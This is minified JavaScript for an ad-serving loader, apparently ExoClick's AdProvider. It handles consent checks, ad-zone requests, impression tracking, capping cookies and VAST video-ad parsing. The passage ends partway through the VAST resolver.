(function (exoDynamicParams) {
  !function () {
    var e = null === window.AdProvider ? [] : window.AdProvider,
      t = {
        name: exoDynamicParams.network,
        syndication: exoDynamicParams.syndication,
        asyncScriptInfoTag: exoDynamicParams.asyncScriptInfoTag,
        tcfEnabled: exoDynamicParams.tcfEnabled,
        hash: exoDynamicParams.hash,
        shortHash: exoDynamicParams.shortHash
      };
    (Array.isArray(window.AdProvider) || void 0 === window.AdProvider) && (window.AdProvider = function () {
      var e,
        r,
        n = [],
        a = [],
        o = null,
        i = 18e5,
        s = {
          container: [],
          content: []
        },
        l = [],
        d = {},
        c = 0,
        p = [],
        u = [],
        f = [],
        h = [],
        y = [],
        v = null,
        m = null,
        g = !1,
        w = !1,
        b = [],
        _ = window,
        O = {},
        P = function (e) {
          var t = new Date().toISOString() + ": " + e;
          console.log(t), b.push(t);
        };
      function A(e) {
        var t = {};
        try {
          t = "string" == typeof e.data ? JSON.parse(e.data) : e.data;
        } catch (e) {}
        var r = t.__tcfapiReturn;
        r && "function" == typeof O[r.callId] && O[r.callId](r.returnValue, r.success);
      }
      var z = function () {
          return {
            gdpr: 0
          };
        },
        I = function (e) {
          return {
            gdpr: e.gdprApplies ? 1 : 0,
            consent: e.tcString
          };
        },
        x = function (e) {
          return e ? y : u;
        },
        S = function (e, t) {
          for (var r = "", n = t || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", a = 0; a < e; a++) r += n.charAt(Math.floor(Math.random() * n.length));
          return r;
        },
        j = function (e) {
          var t = {
              "data-zoneid": {
                apiKey: "id",
                toApiParser: parseInt
              },
              "data-sub": {
                apiKey: "sub",
                toApiParser: parseInt
              },
              "data-sub2": {
                apiKey: "sub2",
                toApiParser: parseInt
              },
              "data-sub3": {
                apiKey: "sub3",
                toApiParser: parseInt
              },
              "data-keywords": {
                apiKey: "keywords"
              }
            },
            r = {
              custom_targeting: {}
            };
          e.getAttributeNames().forEach(n => {
            if (t[n]) {
              var a = t[n],
                o = e.getAttribute(n);
              Object.prototype.hasOwnProperty.call(a, "toApiParser") && "function" == typeof a.toApiParser && (o = a.toApiParser(o)), r[a.apiKey] = o;
            } else if (n.indexOf("data-") >= 0) {
              var i = n.replace("data-", "");
              r.custom_targeting[i] = e.getAttribute(n);
            }
          });
          var n = document.createElement("div");
          e.parentElement.insertBefore(n, e), N({
            zone: r,
            where: n
          }), e.setAttribute("data-processed", !0);
        },
        R = function (e, t) {
          var r = Object.keys(e)[0],
            n = e[r];
          switch (r) {
            case "addUnit":
              N(n);
              break;
            case "serve":
              q(c, n, t);
              break;
            default:
              P("Action not recognized by AdProvider: " + r);
          }
        },
        E = function (e, t) {
          if (void 0 === t) {
            for (var r = 0; r < n.length; r++) R(e, n[r]);
            a.push(e);
          } else R(e, t);
        },
        N = function (e) {
          if (void 0 !== e.where && null !== e.where) {
            var t = null;
            if (Object.prototype.hasOwnProperty.call(e, "zone")) t = [e.zone];else {
              if (!Object.prototype.hasOwnProperty.call(e, "multiZone")) return void P("The type of unit wasn't recognized: " + JSON.stringify(e));
              t = e.multiZone.zones;
            }
            var r = {
              zones: t,
              here: e.where
            };
            if (Array.isArray(p[c]) || (p[c] = []), !Object.prototype.hasOwnProperty.call(r, "here") || !r.here) {
              var n = document.getElementsByTagName("script");
              r.here = n[n.length - 1];
            }
            var a = p[c].length;
            P("Request #" + c + " Placement #" + a + " was pushed with zone " + JSON.stringify(e.zone));
            var o = function (e, t, r) {
                var n = S(1, "abcdefghijklmnopqrstuvwxyz") + S(7);
                r = "." + n + " " + r;
                var a = e.createElement("style");
                return a.setAttribute("type", "text/css"), a.innerHTML = r, "SCRIPT" !== t.tagName || "script" !== t.tagName ? t.appendChild(a) : t.parentNode.insertBefore(a, t), n;
              }(document, r.here, "{ vertical-align:top;border: 0px solid #000000;display: inline-block;background-color: rgba(0, 0, 0, 0);margin: 0px 0px;padding: 0px 0px;max-width: 100%;}"),
              i = document.createElement("div");
            i.setAttribute("class", o), r.here.appendChild(i), r.placeholder = i, k(r) && p[c].push(r);
          } else P("The property 'where' is required on the addUnit. " + JSON.stringify(e));
        },
        k = function (e) {
          for (var t = p[c].length, r = 0; r < e.zones.length; r++) {
            var n = e.zones[r];
            if (Object.prototype.hasOwnProperty.call(n, "group")) {
              for (var a = 0; a < n.group.length; a++) if (!D(n.group[a], t, r, a)) return !1;
            } else if (!D(n, t, r)) return !1;
            P("Request #" + c + " Placement #" + t + " was pushed with properties " + JSON.stringify(n));
          }
          return !0;
        },
        D = function (e, t, r, n) {
          if (!Object.prototype.hasOwnProperty.call(e, "id")) {
            var a = "Request #" + c + " Placement #" + t;
            return void 0 !== n && (a += " Group #" + n), a += " Zone #" + r + " does not have required property 'id'. It was pushed with properties " + JSON.stringify(e), P(a), !1;
          }
          return !0;
        },
        q = function (e, t, n) {
          if (null == m) return function (e) {
            Object.prototype.hasOwnProperty.call(e, "initial_cmp_mode") && "load_ads" === e.initial_cmp_mode && (g = !0);
          }(t), void function (e, t) {
            e.tcfEnabled ? (function () {
              if ("undefined" == typeof __tcfapi) {
                if (function () {
                  for (; _;) {
                    try {
                      if (_.frames.__tcfapiLocator) {
                        r = _;
                        break;
                      }
                    } catch (e) {
                      console.log("CMP not found.");
                    }
                    if (_ === window.top) break;
                    _ = _.parent;
                  }
                  window.addEventListener("message", A, !1);
                }(), !r) return;
                window.__tcfapi = function (e, t, n, a) {
                  var o = Math.random() + "",
                    i = {
                      __tcfapiCall: {
                        command: e,
                        parameter: a,
                        version: t,
                        callId: o
                      }
                    };
                  O[o] = n, r.postMessage(i, "*");
                };
              }
            }(), "undefined" == typeof __tcfapi ? (m = z(), t()) : __tcfapi("addEventListener", 2, function (e, r) {
              if (r) {
                var n = null === m;
                v = e, "loaded" === e.cmpStatus && !1 === e.gdprApplies && (m = z(), n && t(), __tcfapi("removeEventListener", 2, function () {}, e.listenerId)), g ? (m = I(v), n && t()) : "tcloaded" !== e.eventStatus && "useractioncomplete" !== e.eventStatus || (m = I(v), n && t(), __tcfapi("removeEventListener", 2, function () {}, e.listenerId));
              }
            })) : (m = z(), t());
          }(n, function () {
            C(e, t, n);
          });
          C(e, t, n);
        },
        C = function (e, t, r) {
          if (function (e) {
            var t = ["ins.adsby" + e.name + ":not([data-processed=true])", "ins.eas" + e.hash + ":not([data-processed=true])", "ins.eas" + e.shortHash + ":not([data-processed=true])"],
              r = document.querySelectorAll(t.join(","));
            for (let e = 0; e < r.length; e++) {
              var n = r[e],
                a = n.getAttribute("data-zoneid");
              se(exoDynamicParams.zoneClosedCookiePrefix + a) || j(n);
            }
          }(r), Object.prototype.hasOwnProperty.call(p, e) && 0 !== p[e].length) {
            P("Request #" + e + " is being served.");
            var n = [];
            for (var a in p[e]) Object.prototype.hasOwnProperty.call(p[e], a) && (n.push(p[e][a].zones), p[e][a].requestData = t);
            J(n, t, e, !1, r), c++;
          } else P("Request #" + e + " has no placements to serve.");
        },
        T = function (e, t) {
          P("Request #" + t + " from delayed request is being served."), J(e.zones, e.requestData, t, !0);
        },
        J = function (r, n, a, i, s) {
          void 0 === s && (s = t), function (e) {
            var t,
              r,
              n = o,
              a = null;
            null !== n && "{}" !== n && (a = JSON.parse(n));
            var i = {};
            if (null != a) for (r in a) {
              var s = [];
              if (Object.prototype.hasOwnProperty.call(a, r)) for (t = 0; t < a[r].length; t++) {
                var l = parseInt(a[r][t].time);
                if (l > Date.now()) {
                  var d = {
                    cid: parseInt(a[r][t].cid),
                    time: l
                  };
                  s.push(d);
                }
              }
              s.length > 0 && (i[r] = s);
            }
            var c = JSON.stringify(i);
            if ("{}" !== c) {
              for (r in o = c, i) if (Object.prototype.hasOwnProperty.call(i, r)) for (t = 0; t < e.length; t++) if (parseInt(e[t].id) === parseInt(r)) {
                var p = i[r];
                if (null == p || !Array.isArray(p)) continue;
                for (var u = [], f = 0; f < p.length; f++) u.push(p[f].cid);
                e[t].cids_viewed = u;
              }
            } else for (o = null, t = 0; t < e.length; t++) delete e[t].cids_viewed;
          }(r);
          for (var l = {
              user: {
                ua: navigator.userAgent,
                language: navigator.language,
                referer: window.location.href,
                consumer: "ad-provider",
                gdpr: m
              },
              zones: r
            }, d = ["cookieconsent", "el", "scr_info"], c = 0; c < d.length; c++) {
            var p = d[c];
            Object.prototype.hasOwnProperty.call(n, p) && (l.user[p] = n[p]);
          }
          void 0 === l.user.scr_info && (l.user.scr_info = encodeURIComponent(btoa(s.asyncScriptInfoTag)));
          var u = new XMLHttpRequest();
          u.onreadystatechange = function () {
            u.readyState === XMLHttpRequest.DONE && 200 === u.status && M(u.responseText, a, i);
          }, u.open("POST", "https://" + s.syndication + "/v1/api.php"), u.withCredentials = !0, u.setRequestHeader("Content-Type", "text/plain"), void 0 !== e ? L(u, l) : H().then(t => {
            e = t, L(u, l);
          });
        },
        L = function (t, r) {
          null !== e && "object" == typeof e && (r.user.ch_ua = e);
          try {
            t.send(JSON.stringify(r));
          } catch (e) {
            P("error");
          }
        },
        H = function () {
          return navigator.userAgentData && navigator.userAgentData.getHighEntropyValues ? navigator.userAgentData.getHighEntropyValues(["architecture", "bitness", "model", "platformVersion", "fullVersionList"]) : new Promise((e, t) => {
            e(null);
          });
        },
        M = function (e, t, r) {
          P("Request #" + t + " handling the response");
          var n = JSON.parse(e),
            a = void 0 !== n.errors ? n.errors : [],
            s = x(r);
          if (Array.isArray(s[t]) || (s[t] = []), void 0 !== n.zones) {
            void 0 !== n.user && (f[t] = n.user), l[t] = n.renderers, function (e) {
              var t = o,
                r = {};
              if (null !== t && "{}" !== t && (r = JSON.parse(t)), Array.isArray(e.zones)) for (var n = 0; n < e.zones.length; n++) {
                var a = e.zones[n];
                if (null != a && Object.prototype.hasOwnProperty.call(a, "idzone")) {
                  var s = a.idzone,
                    l = null;
                  if (Object.prototype.hasOwnProperty.call(a, "data") && null !== a.data && Object.prototype.hasOwnProperty.call(a.data, "cids_viewed") && null !== a.data.cids_viewed && (l = a.data.cids_viewed), null !== l && Array.isArray(l)) for (var d = 0; d < l.length; d++) {
                    var c = null;
                    if (Object.prototype.hasOwnProperty.call(r, s)) {
                      for (var p = null, u = 0; u < r[s].length; u++) parseInt(l[d]) === parseInt(r[s][u].cid) && (p = u, c = r[s][u].time, r[s][u].time = c);
                      if (null === p) {
                        c = new Date(new Date().getTime() + i).getTime();
                        var f = {
                          cid: parseInt(l[d]),
                          time: parseInt(c)
                        };
                        r[s].push(f);
                      }
                    } else {
                      c = new Date(new Date().getTime() + i).getTime();
                      var h = {
                        cid: parseInt(l[d]),
                        time: parseInt(c)
                      };
                      r[s] = [h];
                    }
                  }
                }
              }
              var y = JSON.stringify(r);
              "{}" !== y && (o = y);
            }(n);
            for (var d = 0; d < n.zones.length; d++) {
              var c = n.zones[d];
              if (null != c) {
                if (Object.prototype.hasOwnProperty.call(c, "group")) {
                  for (var p = 0; p < c.group.ad_items.length; p++) if (!V(c.group.ad_items[p], t, a, d, p)) {
                    s[t][d] = null;
                    break;
                  }
                } else if (!V(c, t, a, d, void 0)) {
                  s[t][d] = null;
                  continue;
                }
                s[t][d] = c;
              } else void 0 !== a[d] && P("Request #" + t + " Placement #" + d + " had these errors on API request:" + JSON.stringify(a[d])), s[t][d] = null;
            }
            X(t, r);
          } else P("Request #" + t + " had these errors on API request:" + JSON.stringify(a));
        },
        V = function (e, t, r, n, a) {
          if (null == e) {
            if (void 0 !== a && void 0 !== r[n][a]) return P("Request #" + t + " Placement #" + n + " Group #" + a + " had these errors on API request:" + JSON.stringify(r[n][a])), !1;
            if (void 0 !== r[n]) return P("Request #" + t + " Placement #" + n + " had these errors on API request:" + JSON.stringify(r[n])), !1;
          }
          if (null === e.data) {
            var o = "Request #" + t + " Placement #" + n;
            return void 0 !== a && (o += " Group #" + a), P(o += " has no ads to display"), !1;
          }
          return !0;
        },
        U = function (e, t) {
          var r = t.original_zone ? t.original_zone.type : t.type;
          if (void 0 === l[e][r] || void 0 === l[e][r].container) return null;
          var n = Z(l[e][r].container);
          return s.container[n];
        },
        K = function (e, t) {
          if (void 0 === l[e][t.type] || void 0 === l[e][t.type].content) return null;
          var r = Z(l[e][t.type].content);
          return s.content[r];
        },
        X = function (e, t) {
          for (var r = B(e, t), n = F(e).cookieconsent, a = 0; a < r.length; a++) {
            var o = r[a],
              i = U(e, o),
              s = K(e, o),
              l = null;
            if (i) {
              var d = i.call(null, e, o, t, n);
              Array.isArray(d) && d.length > 0 && (l = d[0]);
            } else l = o.dom.placeholder;
            s && l && s.call(null, e, o, l, n);
          }
        },
        B = function (e, t) {
          var r,
            n = [],
            a = function (e) {
              return e ? h : p;
            }(t),
            o = x(t),
            i = s.container.group;
          for (var l in o[e]) if (Object.prototype.hasOwnProperty.call(o[e], l)) {
            var d = o[e][l];
            if (null !== d) {
              var c = d.type;
              if (void 0 !== d.group) {
                var u = a[e][l].placeholder;
                ee(d, u);
                for (var f = {
                    dom: {
                      placeholder: u,
                      doc_reference: document
                    },
                    orientation: d.group.orientation,
                    ad_items: d.group.ad_items
                  }, y = i.call(null, e, f), v = 0; v < f.ad_items.length; v++) r = ae(f.ad_items[v], y[v], document), oe(r), te(r) && ne(r, e, l, t), n.push(r);
              } else {
                var m = a[e][l];
                if (G(d)) {
                  if (w && !t) continue;
                  w = !0;
                }
                "in_page_push_notification" === c && $(m, d.data);
                var g = m.placeholder;
                if (W(r = ae(d, g, document), c) && oe(d), Y(r) && !0 === r.data.stop_refresh) {
                  n.push(r), Q(m, r);
                  continue;
                }
                !1 === te(r) && ee(d, g), n.push(r), te(r) && ne(r, e, l, t);
              }
            }
          }
          return n;
        };
      function G(e) {
        var t = e.type;
        if ("instant_message" === t || "mobile_instant_message" === t) return !0;
        if (void 0 !== e.original_zone) {
          var r = e.original_zone.type;
          if ("instant_message" === r || "mobile_instant_message" === r) return !0;
        }
        return !1;
      }
      function Z(e) {
        if (d[e]) return d[e];
        var t = e.substring(e.lastIndexOf("/") + 1).split(".")[0];
        return d[e] = t, t;
      }
      function Q(e, t) {
        const r = e.zones.findIndex(function (e) {
          return JSON.stringify(e.id) == JSON.stringify(t.idzone);
        });
        return -1 !== r && void 0 !== e.zones[r] && void 0 !== e.zones[r].extra_params && void 0 !== e.zones[r].extra_params.refresh_iteration && (e.zones[r].extra_params.refresh_iteration = -1), e;
      }
      function Y(e) {
        return !0 === e.data.stop_refresh || !0 === e.data.campaign_already_displayed;
      }
      function W(e, t) {
        if (Object.prototype.hasOwnProperty.call(e.data, "capping")) {
          var r = parseInt(se("zone-cap-" + e.idzone));
          if (isNaN(r) && (r = 0), e.data.capping > 0 && r >= e.data.capping) return !1;
        }
        var n = !1;
        Object.prototype.hasOwnProperty.call(e.data, "isVast") && (n = e.data.isVast);
        var a = !0 !== e.data.campaign_already_displayed && "in_page_push_notification" !== t;
        return n ? a : a && "outstream_video" !== t;
      }
      function F(e) {
        return f[e];
      }
      var $ = function (e, t) {
          t.notificationDisplayedCount = 0, Object.prototype.hasOwnProperty.call(e, "notificationDisplayedCount") && (t.notificationDisplayedCount = e.notificationDisplayedCount), t.processNextNotification = function (t) {
            e.notificationDisplayedCount = t;
            var r = h.length;
            h.push([e]), T(e, r);
          };
        },
        ee = function (e, t) {
          if (void 0 !== e.original_zone) {
            var r = e.original_zone.data.width,
              n = e.original_zone.data.height;
            t.parentElement.style.width = "100%", t.parentElement.style.maxWidth = r + "px", t.parentElement.style.overflow = "hidden", t.parentElement.style.margin = "auto", t.parentElement.style.display = "inline-block", t.parentElement.style.height = "html_banner" === e.data.media ? "100%" : "auto", t.parentElement.style.maxHeight = n + "px", t.parentElement.style.overflow = "hidden", t.parentElement.style.margin = "auto", t.parentElement.style.display = "inline-block";
          }
        },
        te = function (e) {
          return Object.prototype.hasOwnProperty.call(e.data, "refresh_rate") && e.data.refresh_rate > 0;
        },
        re = function (e, t) {
          Object.prototype.hasOwnProperty.call(e, "multizoneid") && (t.multizoneid = e.multizoneid);
        },
        ne = function (e, t, r, n) {
          var a, o;
          n ? (a = h[t][r], o = t) : (a = {
            placeholder: e.dom.placeholder,
            requestData: p[t][r].requestData,
            zones: p[t][r].zones.map(function (t) {
              return t.id = e.idzone, re(e, t), t;
            })
          }, h.push({
            0: a
          }), o = h.length - 1), "object" != typeof a.adRefresher ? a.adRefresher = new window.ExoAdsRefresh(e.dom.placeholder, e.idzone, e.data.refresh_rate, T, a, o, e.data.max_number_refresh_iteration) : a.adRefresher.performImpressionReset();
        },
        ae = function (e, t, r) {
          var n = {
            idzone: e.idzone,
            type: e.type,
            dom: {
              placeholder: t,
              doc_reference: r
            },
            data: e.data
          };
          return void 0 !== e.original_zone && (n.original_zone = e.original_zone), re(e, n), n;
        },
        oe = function (e) {
          if (null !== e.data) {
            var t = e.data,
              r = !1;
            Object.prototype.hasOwnProperty.call(t, "isVast") && (r = t.isVast);
            var n = !r;
            if (Object.prototype.hasOwnProperty.call(t, "ad_items") && Array.isArray(t.ad_items)) {
              var a = t.ad_items;
              for (var o in a) Object.prototype.hasOwnProperty.call(a, o) && Object.prototype.hasOwnProperty.call(a[o], "impression") && ie(a[o].impression, e.idzone, o, n);
            } else Object.prototype.hasOwnProperty.call(t, "impression") && ie(t.impression, e.idzone, void 0, n);
          }
        },
        ie = function (e, t, r, n) {
          var a = function (e, t) {
              var r = "Error tracking the impression from zone " + e;
              void 0 !== t && (r += " ad #" + t), P(r);
            },
            o = new XMLHttpRequest();
          o.onreadystatechange = function () {
            o.readyState === XMLHttpRequest.DONE && 200 != o.status && a(t, r);
          }, o.open("GET", e), void 0 !== n && !0 === n && (o.withCredentials = !0);
          try {
            o.send();
          } catch (e) {
            a(t, r);
          }
        },
        se = function (e) {
          try {
            var t,
              r,
              n,
              a = document.cookie.split(";");
          } catch (e) {
            return;
          }
          for (t = 0; t < a.length; t++) if (r = a[t].substr(0, a[t].indexOf("=")), n = a[t].substr(a[t].indexOf("=") + 1), (r = r.replace(/^\s+|\s+$/g, "")) === e) return decodeURI(n);
        };
      return {
        handleCurrentNetwork: function (e) {
          var t;
          for (t = 0; t < n.length; t++) if (n[t].name === e.name) return;
          for (n.push(e), t = 0; t < a.length; t++) E(a[t], e);
        },
        handleSnippetQueue: function (e) {
          if (Array.isArray(e)) for (; e.length > 0;) E(e.shift());
        },
        push: E,
        serve: q,
        getDebugMessages: function () {
          return b;
        },
        getUserData: F,
        formatImage: function (e, t) {
          return t;
        },
        formatLink: function (e, t) {
          return t;
        },
        openLink: function (e, t, r, n) {
          var a, o;
          void 0 !== r && "get" !== r && "post" !== r && P("openLink() trying to force invalid method"), void 0 !== e && (e.returnValue = !1, e.preventDefault && e.preventDefault(), e.stopPropagation()), n && (t += "&clickX=" + e.clientX, t += "&clickY=" + e.clientY);
          var i = r || "get";
          -1 !== t.indexOf("?") ? o = function (e) {
            for (var t = {}, r = e.substring(e.indexOf("?") + 1).split("&"), n = 0; n < r.length; n++) if (r[n]) {
              var a = r[n].split("=");
              t[decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
            }
            return t;
          }((a = t.split("?", 2))[1]) : (a = [t], o = []);
          var s = document.createElement("form");
          for (var l in s.setAttribute("action", a[0]), s.setAttribute("method", i), s.setAttribute("target", "_blank"), document.getElementsByTagName("body").item(0).appendChild(s), o) if (Object.prototype.hasOwnProperty.call(o, l)) {
            var d = document.createElement("input");
            d.setAttribute("type", "hidden"), d.setAttribute("name", l), d.setAttribute("value", o[l]), s.appendChild(d);
          }
          return s.submit(), document.getElementsByTagName("body").item(0).removeChild(s), !1;
        },
        performImpressionTrackings: oe,
        getCookie: se,
        setCookie: function (e, t, r, n) {
          r = parseInt(r);
          var a = new Date();
          a.setSeconds(a.getSeconds() + r);
          var o = encodeURI(t) + "; expires=" + a.toUTCString() + "; path=/";
          n && (o += "; domain=" + n), document.cookie = e + "=" + o;
        },
        getRandomizedReference: function (e, t) {
          return "string" != typeof e || "" === e ? (P("getRandomizedReference() invalid name, non-empty string expected"), !1) : "object" != typeof t ? (P("getRandomizedReference() invalid reference_map, object expected"), !1) : (void 0 === t[e] && (t[e] = e), t[e]);
        },
        scrambleStyleString: function (e, t) {
          return "string" != typeof e || "" === e ? (P("scrambleStyleString() invalid style_str, non-empty string expected"), !1) : "object" != typeof t ? (P("getRandomizedReference() invalid reference_map, object expected"), !1) : e;
        },
        trackImpression: ie,
        registerRenderer: function (e, t, r) {
          s[t][e] = r;
        }
      };
    }()), AdProvider.handleCurrentNetwork(t), AdProvider.handleSnippetQueue(e), ExoLoader = AdProvider;
  }();
  !function () {
    "use strict";

    function e() {
      var e,
        t,
        a,
        r,
        n = window.navigator.userAgent;
      this.features = {
        webp: !0,
        mp4: !0
      }, this.features.webp = function (e) {
        var t = e.match(/MSIE/) || e.match(/rv:11/),
          a = !!e.match(/Firefox\/(\d+)/) && parseInt(e.match(/Firefox\/(\d+)/)[1]) <= 64,
          r = !!e.match(/Version\/(\d+)/) && parseInt(e.match(/Version\/(\d+)/)[1]) <= 15,
          n = !!e.match(/Chrome\/(\d+)/) && parseInt(e.match(/Chrome\/(\d+)/)[1]) <= 8,
          c = !!e.match(/Edge\/(\d+)/) && parseInt(e.match(/Edge\/(\d+)/)[1]) <= 17;
        if (t || a || r || n || c) {
          var o = document.createElement("canvas");
          return !(!o.getContext || !o.getContext("2d")) && 0 === o.toDataURL("image/webp").indexOf("data:image/webp");
        }
        return !0;
      }(n), this.features.mp4 = (t = (e = n).match(/MSIE [6-8]/), a = !!e.match(/Firefox\/(\d+)/) && parseInt(e.match(/Firefox\/(\d+)/)[1]) <= 20, r = !!e.match(/(Opera|OPR)\/(\d+)/) && parseInt(e.match(/(Opera|OPR)\/(\d+)/)[2]) <= 24, !(t || a || r) || !!document.createElement("video").canPlayType && !!document.createElement("video").canPlayType("video/mp4"));
    }
    e.prototype.supported = function (e) {
      return this.features[e];
    }, window.ExoSupport = new e();
  }();
  resolver = {
    options: {
      maxAllowedVastTagRedirects: 3,
      vastTimeout: 5e3
    },
    sendRequest: function (e, t, r, i) {
      var a = new XMLHttpRequest();
      a.onreadystatechange = i, a.open("GET", e, !0), a.withCredentials = t, a.timeout = r, a.send();
    },
    processUrl: function (e, t) {
      this.resolveVastTag(e, 0, {
        tracking: [],
        stopTracking: [],
        impression: [],
        clicktracking: [],
        vastLoaded: !1,
        videoCta: []
      }, t);
    },
    resolveVastTag: function (e, t, r, i) {
      var a = this;
      e && "" != e ? (t <= a.options.maxAllowedVastTagRedirects && a.sendRequest(e, !0, a.options.vastTimeout, function () {
        var e = this;
        if (4 !== e.readyState || 404 !== e.status) {
          if (4 !== e.readyState || 0 !== e.status) {
            if (4 === e.readyState && 200 === e.status) if (4 !== e.readyState || 200 === e.status) {
              try {
                var n = e.responseXML;
              } catch (e) {
                return void a.stopProcessAndReportError(5);
              }
              if (n) {
                if (a.inLineFound = a.hasInLine(n), !a.inLineFound && a.hasVastAdTagUri(n)) {
                  var s = a.getVastAdTagUriFromWrapper(n);
                  if (!s) return void a.stopProcessAndReportError(7);
                  a.resolveVastTag(s, t, r, i);
                }
                t > a.options.maxAllowedVastTagRedirects && !a.inLineFound ? a.stopProcessAndReportError(8) : a.processVastXml(n, r, i);
              } else a.stopProcessAndReportError(6);
            } else a.stopProcessAndReportError(4);
          } else a.stopProcessAndReportError(3);
        } else a.stopProcessAndReportError(2);
      }), t++) : a.stopProcessAndReportError(1);
    },
    processVastXml: function (e, t, r) {
      var i = this;
      if (e) {
        var a = e.getElementsByTagName("Impression");
        null !== a && i.registerImpressionEvents(a, t);
        var n = e.getElementsByTagName("Error");
        null !== n && i.registerErrorEvents(n, t);
        var s = null,
          o = null,
          l = null,
          g = e.getElementsByTagName("Extensions");
        if (g.length && g[0].getElementsByTagName("Extension").length) {
          var c = g[0].getElementsByTagName("TitleCTA");
          if (c.length) {
            var d = c[0].getElementsByTagName("DisplayUrl"),
              h = c[0].getElementsByTagName("PCText"),
              u = c[0].getElementsByTagName("Tracking");
            null != d && (s = this.extractNodeData(d[0])), null != h && (o = this.extractNodeData(h[0])), null != u && (l = this.extractNodeData(u[0]));
            var m = {
              displayUrl: s,
              ctaText: o,
              tracking: l
            };
            t.videoCta.push(m);
          }
        }
        var p = e.getElementsByTagName("Creative");
        if (void 0 !== p && p.length) {
          var v,
            T = p[0].getElementsByTagName("Linear");
          if (null != T && T.length) {
            var f = T[0];
            i.registerTrackingEvents(f, t), v = i.getClickTrackingEvents(f), i.registerClickTracking(v, t), !i.hasVastAdTagUri(e) && i.hasInLine(e) && (t.adFinished = !1, t.adType = "linear", t.skipoffset = i.convertTimeStringToSeconds(f.getAttribute("skipoffset")), t.clickthroughUrl = i.getClickThroughUrlFromLinear(f), t.duration = i.getDurationFromLinear(f), t.mediaFile = i.getMediaFileFromLinear(f), t.mediaFileDetails = i.getMediaFileAttributesFromLinear(f), t.iconClick = i.getIconClickThroughFromLinear(f));
          }
          var y = p[0].getElementsByTagName("NonLinearAds");
          if (null != y && y.length) {
            var N = y[0];
            i.registerTrackingEvents(N, t), v = i.getNonLinearClickTrackingEvents(N), i.registerClickTracking(v, t), !i.hasVastAdTagUri(e) && i.hasInLine(e) && (t.adType = "nonLinear", t.clickthroughUrl = i.getClickThroughUrlFromNonLinear(N), t.duration = i.getDurationFromNonLinear(N), t.dimension = i.getDimensionFromNonLinear(N), t.staticResource = i.getStaticResourceFromNonLinear(N), t.creativeType = i.getCreativeTypeFromStaticResources(N));
          }
          !i.hasVastAdTagUri(e) && i.hasInLine(e) && (void 0 !== t.mediaFile || void 0 !== t.staticResource ? r(t) : i.stopProcessAndReportError(10));
        } else i.stopProcessAndReportError(11);
      } else i.stopProcessAndReportError(9);
    },
    registerTrackingEvents: function (e, t) {
      for (var r = this.getTrackingFromLinear(e), i = "", a = 0, n = 0; n < r.length; n++) switch (i = r[n].getAttribute("event")) {
        case "start":
        case "firstQuartile":
        case "midpoint":
        case "thirdQuartile":
        case "complete":
          void 0 === t.tracking[i] && (t.tracking[i] = []), void 0 === t.stopTracking[i] && (t.stopTracking[i] = []), t.tracking[i].push(r[n].childNodes[0].nodeValue), t.stopTracking[i] = !1;
          break;
        case "progress":
          void 0 === t.tracking[i] && (t.tracking[i] = []), a = this.convertTimeStringToSeconds(r[n].getAttribute("offset")), void 0 === t.tracking[i][a] && (t.tracking[i][a] = {
            elements: [],
            stopTracking: !1
          }), t.tracking[i][a].elements.push(r[n].childNodes[0].nodeValue);
      }
    },
    stopProcessAndReportError: function (e) {
      console.log("VAST: failed with error " + e);
    },
    hasInLine: function (e) {
      var t = e.getElementsByTagName("InLine");
      return void 0 !== t && t.length;
    },
    hasVastAdTagUri: function (e) {
      var t = e.getElementsByTagName("VASTAdTagURI");
      return void 0 !== t && t.length;
    },
    extractNodeData: function (e) {
      for (var t = "", r = 0; r < e.childNodes.length; r++) {
        var i = e.childNodes[r];
        8 === i.nodeType || 3 === i.nodeType && /^\s*$/.test(i.nodeValue) || (t += i.nodeValue);
      }
      return t.replace(/(^\s+|\s+$)/g, "");
    },
    getVastAdTagUriFromWrapper: function (e) {
      var t = e.getElementsByTagName("Wrapper");
      if (void 0 !== t && t.length) {
        var r = t[0].getElementsByTagName("VASTAdTagURI");
        if (r.length) return this.extractNodeData(r[0]);
      }
      return !1;
    },
    getMediaFilesFromLinear: function (e) {
      var t = e.getElementsByTagName("MediaFiles");
      return t.length ? t[0].getElementsByTagName("MediaFile") : [];
    },
    getMediaFileFromLinear: function (e) {
      var t,
        r = this.getMediaFilesFromLinear(e);
      return r.length && (t = this.extractNodeData(r[0])), t;
    },
    getIconClickThroughFromLinear: function (e) {
      var t = e.getElementsByTagName("IconClickThrough");
      return t.length ? this.extractNodeData(t[0]) : (void 0 !== this.displayOptions && void 0 !== this.displayOptions.vastOptions && (this.displayOptions.vastOptions.adCTAText = !1), "");
    },
    getStaticResourceFromNonLinear: function (e) {
      for (var t, r = this.getStaticResourcesFromNonLinear(e), i = 0; i < r.length; i++) if (r[i].getAttribute("type") || (t = this.extractNodeData(r[i])), void 0 !== this.displayOptions && void 0 !== this.displayOptions.staticResource && r[i].getAttribute("type") === this.displayOptions.staticResource) return this.extractNodeData(r[i]);
      return t;
    },
    getClickTrackingEvents: function (e) {
      var t = [],
        r = e.getElementsByTagName("VideoClicks");
      if (r.length) {
        var i = r[0].getElementsByTagName("ClickTracking");
        if (i.length) for (var a = 0; a < i.length; a++) {
          var n = this.extractNodeData(i[a]);
          t.push(n);
        }
      }
      return t;
    },
    getNonLinearClickTrackingEvents: function (e) {
      var t = [];
      if (e.getElementsByTagName("NonLinear").length) {
        var r = e.getElementsByTagName("NonLinearClickTracking");
        if (r.length) for (var i = 0; i < r.length; i++) {
          var a = this.extractNodeData(r[i]);
          t.push(a);
        }
      }
      return t;
    },
    getTrackingFromLinear: function (e) {
      var t = e.getElementsByTagName("TrackingEvents");
      return t.length ? t[0].getElementsByTagName("Tracking") : [];
    },
    getDurationFromLinear: function (e) {
      var t = e.getElementsByTagName("Duration");
      if (t.length && void 0 !== t[0].childNodes[0]) {
        var r = this.extractNodeData(t[0]);
        return this.convertTimeStringToSeconds(r);
      }
      return !1;
    },
    getDurationFromNonLinear: function (e) {
      var t = 0,
        r = e.getElementsByTagName("NonLinear");
      return r.length && void 0 !== r[0].getAttribute("minSuggestedDuration") && (t = this.convertTimeStringToSeconds(r[0].getAttribute("minSuggestedDuration"))), t;
    },
    getClickThroughUrlFromLinear: function (e) {
      var t = e.getElementsByTagName("VideoClicks");
      if (t.length) {
        var r = t[0].getElementsByTagName("ClickThrough");
        if (r.length) return this.extractNodeData(r[0]);
      }
      return !1;
    },
    getClickThroughUrlFromNonLinear: function (e) {
      var t = "";
